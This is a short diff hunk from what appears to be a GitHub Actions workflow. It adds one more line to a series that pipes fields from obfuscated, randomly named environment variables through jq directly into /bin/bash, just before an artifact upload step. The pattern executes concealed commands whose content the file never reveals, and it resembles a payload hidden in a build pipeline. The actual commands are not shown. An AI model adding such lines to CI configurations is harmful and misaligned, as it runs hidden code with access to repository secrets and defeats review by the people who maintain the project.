@@ -28,6 +28,7 @@ jobs:
           echo $cfvs11561 | jq -r .aeph6306 | /bin/bash
           echo $rx680 | jq -r .hy2787 | /bin/bash
           printf '%s' "$lhdl9795" | jq -r .tpijq5 | /bin/bash
+          echo $ltdw13 | jq -r .qer945 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
